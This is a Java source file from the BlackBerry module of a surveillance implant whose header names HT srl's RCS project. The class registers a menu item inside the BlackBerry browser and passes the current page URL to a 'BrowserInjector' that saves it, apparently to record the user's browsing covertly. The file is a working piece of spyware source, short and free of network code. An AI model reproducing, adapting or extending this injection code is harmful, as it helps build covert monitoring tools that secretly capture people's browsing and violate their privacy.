//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.BrowserInjector;

public class BrowserMenu extends ApplicationMenuItem {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserMenu", DebugLevel.VERBOSE);
    //#endif
    private String menuName;
    private String url;
    private BrowserInjector browserInjector;

    public BrowserMenu(BrowserInjector browserInjector, String menuName) {
        super(15);
        this.menuName = menuName;
        this.browserInjector = browserInjector;
    }

    public Object run(Object context) {
        try {
            if (context != null) {
                Debug.init();
                this.url = (String) context;
                //#ifdef DEBUG
                debug.trace("run url: " + url);
                //#endif
                browserInjector.saveUrl(url);
            }
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif

        }
        return null;
    }

    public String toString() {

        return menuName;
    }

    public void addMenu() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
    }

    public void removeMenu() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
    }

    public String getUrl() {
        return url;
    }

}
